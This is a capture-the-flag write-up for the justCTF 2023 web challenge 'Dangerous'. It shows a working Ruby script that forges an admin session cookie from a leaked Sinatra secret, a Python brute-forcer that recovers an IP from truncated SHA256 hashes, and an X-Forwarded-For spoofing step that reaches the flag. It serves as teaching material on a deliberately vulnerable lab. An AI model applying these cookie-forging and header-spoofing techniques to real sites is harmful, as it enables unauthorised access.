---
title: "justCTF 2023"
categories: [Writeups]
layout: post 
---

# justCTF 2023 Writeups

## Categories
* ### Web
    * #### [Dangerous](#challenge-dangerous)

-------------------------------------------------------------------------------

### Challenge: Dangerous
### Category: Web

## Description:

My friend told me there's a secret page on this forum, but it's only for administrators.

## Walkthrough:

Navigating to the provided URL, we're presented with a forum web application:

![](/assets/img/writeups/justCTF2023/Dangerous%20Writeup.001.png)

Taking a look at the first thread, we can see there is an admin user named `janitor`:

![](/assets/img/writeups/justCTF2023/Dangerous%20Writeup.002.png)

We can try to add a comment, but nothing is displayed on the page. 

Let's take a look at the provided web application code, `dangerous.rb`. It is written in Ruby and makes use of the [Sinatra](https://sinatrarb.com/) web framework, a SQLite3 database, and the Erubi template engine.

```ruby
require "sinatra"
require "sqlite3"
require "erubi"
require "digest"
require "json"
```

The application uses bind variables for any SQL queries with user input (bound to the `?` placeholders in the query), so SQL injection doesn't seem to be the vulnerability. And user input is never passed to the template engine, eliminating the possibility for Server Side Template Injection (SSTI).

```ruby
def get_replies(con, id)
  return con.execute("SELECT *, null, 0 as p FROM threads WHERE id=? 
                    UNION SELECT *, 1 as p FROM replies WHERE thread_id=? order by p", [id, id])
end
...
erb :login
...
```

Scrolling down the page, we see a `/flag` endpoint and `is_allowed_ip` function which are interesting:

```ruby
def is_allowed_ip(username, ip, config)
  return config["mods"].any? {
    |mod| mod["username"] == username and mod["allowed_ip"] == ip
  }
end

...

get "/flag" do
  if !session[:username] then
    erb :login
  elsif !is_allowed_ip(session[:username], request.ip, config) then
    return [403, "You are connecting from untrusted IP!"]
  else
    return config["flag"] 
  end
end
```

So it looks like, in order for us to get the flag, we need to satisfy this `is_allowed_ip` check. This function uses data from `config.json`, which we are provided a sample of:

```
// Example data, change this!!!
{
	"mods": [
		{
			"username": "admin",
			"password": "testpasswd123",
			"allowed_ip": "127.0.0.1"
		}
	],
	"flag": "testflag"
}
```

`is_allowed_ip` checks to see if the username in our session cookie and the IP address we're connecting from matches what is in `config.json`.

After messing with the application long enough I noticed if you create a thread but do not supply any content, the website returns an error page with a backtrace and environment variables:

![](/assets/img/writeups/justCTF2023/Dangerous%20Writeup.003.png)

Scrolling down the page, we can see the session secret and information about how the cookie is encoded:

![](/assets/img/writeups/justCTF2023/Dangerous%20Writeup.004.png)

Since we have the session secret, we can probably forge our own cookies.

After reading and copying parts of the Sinatra [source code](https://github.com/sinatra/sinatra/blob/main/rack-protection/lib/rack/protection/encryptor.rb), I created a ruby script to modify my session cookie to include a `username` key where the value is the admin user `janitor`:

```ruby
require 'pp'
require 'base64'
require 'openssl'
require 'digest'
require 'uri'

CIPHER = "aes-256-gcm"
DELIMITER = "--"

def base64_encode(str)
    [str].pack('m0')
end

def base64_decode(str)
    str.unpack1('m0')
end

def encrypt_message(data, secret, auth_data = '')
   raise ArgumentError, 'data cannot be nil' if data.nil?

   cipher = OpenSSL::Cipher.new(CIPHER)
   cipher.encrypt
   cipher.key = secret[0, cipher.key_len]

   # Rely on OpenSSL for the initialization vector
   iv = cipher.random_iv

   # This must be set to properly use AES GCM for the OpenSSL module
   cipher.auth_data = auth_data
   cipher_text = cipher.update(data)
   cipher_text << cipher.final

   "#{base64_encode cipher_text}#{DELIMITER}#{base64_encode iv}#{DELIMITER}#{base64_encode cipher.auth_tag}"
end

def decrypt_message(data, secret)
    return unless data

    cipher = OpenSSL::Cipher.new(CIPHER)
    cipher_text, iv, auth_tag = data.split(DELIMITER, 3).map! { |v| base64_decode(v) }

   # This check is from ActiveSupport::MessageEncryptor
   # see: https://github.com/ruby/openssl/issues/63
   return if auth_tag.nil? || auth_tag.bytes.length != 16

   cipher.decrypt
   cipher.key = secret[0, cipher.key_len]
   cipher.iv  = iv
   cipher.auth_tag = auth_tag
   cipher.auth_data = ''

   decrypted_data = cipher.update(cipher_text)
   decrypted_data << cipher.final
   decrypted_data
   rescue OpenSSL::Cipher::CipherError, TypeError, ArgumentError
    nil
end

c = "gamxdb2ML/3uahCEluToNpGnPwgKQjpkeEQBqd+I4LfvUEd0gm98tEBqEPnB2fYsKbhG/e27rscoTYous4UBqMzrZjAke65gMOtC8n2A9GGH3IJ5y3PQY/GySW1N1I1A37/gCXPm2SdiaDCck4wNnaJ3Yi2PY33GD1L8tEs1fqtqSPfUZDDhFaXXKsnDBbgVyFA9dYs3RMd5Sb1GE7VrSUYSYRFrKT6ZCNH0g+AKyzEJLCLvmt2sWI8UEQEkorUCTCMdcQ6nQ3wVBpzwvhSy2P5kKYRO5WWr+30Xjq9j7+is8ryPtxQHRk4y4MgYyRbB+HvvL/JgPtY9nbPPnOfMiBWROVcY9rHBAmZz3dxCuFoB3LhEiIFUxgEY1iPCCycKjXSxoyA+T+3uotRc6b1Yd02xpYbUnXox--zvcxYAYFvc7xc9CI--IPBPqUV2BtZDig9u60JirA=="
secret = ['9bab60cdf2778ef6bc56bcc76abdc9ce6cdce3b2f47c60e0dcde4b4c8f81f976febf3118e1a8bfaaeb6fc9815ea93a5bf544963b79d8a655a2b51455b2a80a5b'].pack('H*')
object = Marshal.load(decrypt_message(c, secret))
object['username'] = "janitor"

pp object

enc = encrypt_message(Marshal.dump(object), secret).gsub("=", "%3D").gsub("/", "%2F").gsub("+", "%2B").gsub(".", "%2E")
print "\n" + enc + "\n"
```

Storing our current session cookie as a string in the `c` variable and running the script, generates our malicious session cookie:

```bash
$ ruby solve.rb
{"tracking"=>
  {"HTTP_USER_AGENT"=>
    "mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/114.0.5735.134 safari/537.36"},
 "session_id"=>
  "ebd98ad5df90a79d72be1f55ad8635203ec552fa4793142ea5ba776a7819497a",
 "csrf"=>"oXPWvjH9GtY3QK5xUX4HvDGk6OfkaKsFmYJWh4_AzxY=",
 "username"=>"janitor"}

RKfhit9qyT9scO36jq369gFAXJ%2FlC81vuBLrWiUIaGzhQVpWfem3hjuPhtUuKdmjxJsT1DagHNNG17tQlHkXGCd8GOm4FMDh1dT%2Bfwiz%2F98J9gh1DkDJWB%2F3ERknsmBxLFV4MH4IUL6TOg2p8JKmnPf7XiRhJLMpn7Xh6whpJzNbxZY2qp9Fh62f4qKDveD7Fkn2h53Iyq1%2Fp9eJUfF20Yynxb4lK2ebnqWcC39uErgRuv70VIelXFFpGB75ZGPI0ub0xfHZpiWlwbOVjjL1jQDCAN5N1033kerEAwhXODGiQ0RN4fSU44gb0pqqysE7rYOVaretau6EIj0UywgJB2yAsssnyFMGSGbx9GU4YXjMFS54WOZVZbshA0YLocPjKNXQw9y36izOF4Kh2wVA8689PjGhUwLOd319zA4achQWwsZLfZG8F8TerjcCTNlGrhgGX%2FE%3D--%2FWfXJdhObyH7tls%2F--yXzsZnsXQipiA4LAPGxMAA%3D%3D
```

We can attempt to navigate to the `/flag` endpoint using this cookie:

![](/assets/img/writeups/justCTF2023/Dangerous%20Writeup.005.png)

As expected, we're still unable to pass the IP check. There are [many](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/special-http-headers#headers-to-change-location) HTTP headers that can be used to spoof our IP address; perhaps the most well known is `X-Forwarded-For`.

I initially tried supplying `X-Forwarded-For: 127.0.0.1` in hopes that we just needed to appear as if we were coming from within the local network, but this did not work. So we do not know the IP address needed..

My teammate [dayt0n](https://dayt0n.com/) noticed that the `replies` SQLite table in the code contains an `ip` column:

```ruby
con.execute "CREATE TABLE IF NOT EXISTS replies(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        content TEXT,
        ip TEXT,
        username TEXT,
        thread_id INTEGER
    );"
```

And that this IP field is actually used to display the first 6 characters of the SHA256 hash of a user's IP address concatenated with the thread ID whenever they reply to a thread:

```html
	<% @replies.each do |reply| %>
		<div style="padding-bottom: 1rem">
			<% user_color = Digest::SHA256.hexdigest(reply[2] + @id).slice(0, 6) %>
			<div style="color: #<%= user_color %>;">
				<%= user_color %>
			<% if reply[3] %>
				<span style="color: #ff0000;">##Admin:<%= reply[3] %>##</span>
			<% end %>
			</div>
			<div><%= reply[1] %></div>
		</div>
	<% end %>
```

Both threads have a reply from the `janitor` admin:

![](/assets/img/writeups/justCTF2023/Dangerous%20Writeup.006.png)

![](/assets/img/writeups/justCTF2023/Dangerous%20Writeup.007.png)

Knowing this, we can bruteforce the IP address by finding the IP address that produces the matching hashes when concatenated with the thread IDs `1` and `2`:

```python
from hashlib import sha256

for a in range(256):
    for b in range(256):
        for c in range(256):
            for d in range(256):

                ip = f"{a}.{b}.{c}.{d}"
                one = sha256((ip + "1").encode()).hexdigest()[:6]
                two = sha256((ip + "2").encode()).hexdigest()[:6]
                if (one == "5b3477") and (two == "a00734"):
```

Running the script produces the correct IP after a few minutes:

```bash
$ python3 solve.py
144.24.170.69
```

### Note: As I'm writing this, I've noticed there is actually a mistake with the challenge files provided on Github after the competition. The SQLite database storing the replies table shows a different IP address than the one in the `config.json`:

![](/assets/img/writeups/justCTF2023/Dangerous%20Writeup.008.png)

![](/assets/img/writeups/justCTF2023/Dangerous%20Writeup.009.png)

This means that even though the script is technically correct, whenever I try to provide the X-Forwarded-For header with `144.24.170.69`, I will still get the error. 

![](/assets/img/writeups/justCTF2023/Dangerous%20Writeup.010.png)

Modifying the `sqlite.db` file to store the correct IP value and rerunning the Docker setup, we get new hash values:

![](/assets/img/writeups/justCTF2023/Dangerous%20Writeup.011.png)

![](/assets/img/writeups/justCTF2023/Dangerous%20Writeup.012.png)

These are the same hash values shown during the competition.

Rerunning the script with these hash values, we get the correct IP:

```bash
$ python3 solve.py
10.24.170.69
```

Rebuilding the docker container generates a new session secret. So after modifying the cookie forging script to use this secret, we can run the script once again to get our forged cookie.

```bash
$ ruby solve.rb
{"session_id"=>
  "fd4b8a1675e08a64faade074b94fd801a6a08cd3d243f71f02f2436492d8c4f3",
 "csrf"=>"wLZQJop4YbllHXrc2DjjJGH1ccPBi5BAAzBAC8NBB4Q=",
 "tracking"=>
  {"HTTP_USER_AGENT"=>
    "mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/114.0.5735.134 safari/537.36"},
 "username"=>"janitor"}

BzTT0oQBBXE6CuMOXI9s6LBrkGFr7rjG8UCuAE5ABOizIrjYr31A9elerGpXi5JRkNwVd9wZrcQxZPV2vtvmYrxif2xg%2FkiNCRDsNpjjiCevNwGm0hwmnh7hSkV0aD%2FWvCFehu1O%2BPYn%2FEEFhpbAwP1P5JjuogKnJnICO7lhpsMIxhX5ASceSvWJ7u1Paz4LvnSyJrTO%2BeK7a5dGNnpSK9i9pJpVaD4JjLWYWsCxQS8NbSQJiWGa73gkK2xHR4tOCTqa8es4vi2ryFnnnZC%2FbAsUQvxoygMyLPT7xZst%2B0%2BoKwBm8wAmjCO3BoQvq7XG%2BKqzTtryUrO3Trxu7Dl4yJOvXVl7vjBo9D5lbHWoD5sYDWM8XpQLbiKYfAnAHi%2BPlRMQ1Hp%2BzzSuWEj0ztKxgWtXw0BV1gn4LHr0%2Fdkteen72%2Ft637H6eRonPxoa0A9THAJGB4k%3D--AD2tt67hU44aGI7n--s%2Bqymfz%2FOP%2Flb0nSjIW2vg%3D%3D
```

Supplying this cookie and `X-Forwared-For: 10.24.170.69` to the endpoint `/flag`, we get the flag:

![](/assets/img/writeups/justCTF2023/Dangerous%20Writeup.013.png)

### Flag: justCTF{1_th1nk_4l1ce_R4bb1t_m1ght_4_4_d0g}